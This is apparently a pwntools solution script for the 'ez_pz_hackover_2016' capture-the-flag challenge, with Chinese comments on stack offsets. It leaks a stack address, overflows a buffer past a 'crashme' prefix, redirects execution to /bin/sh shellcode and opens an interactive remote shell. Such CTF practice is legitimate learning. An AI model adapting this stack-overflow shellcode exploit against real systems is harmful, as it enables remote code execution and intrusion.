from pwn import *
context(os='linux', arch='i386', log_level='debug')

# io = process('./ez_pz_hackover_2016')
io = remote('node4.buuoj.cn',25470)
elf = ELF('./ez_pz_hackover_2016')

offset = 0xffffcaa8 - 0xffffca92 #ida错误--gdb调试得到缓冲区到ebp为22字节
offset2 = 0xffffcacc - 0xffffca92 #程序给的栈地址到缓冲区的偏移为58，减去前面需要覆盖的22+4个字节

io.recvuntil(b'lets crash: ')
stack_addr = io.recv(10)
stack_addr = int(str(stack_addr,encoding='utf-8'),16)

shellcode = asm(shellcraft.sh())
shellcode_addr = stack_addr - (offset2 - 26 - 4) #26+4代表26字节的垃圾数据填充和shellcode_addr本身的四个字节

payload = b'crashme\x00'.ljust((offset + 4),b'\x00') + p32(shellcode_addr) + shellcode
io.sendlineafter(b'>',payload)
io.interactive()
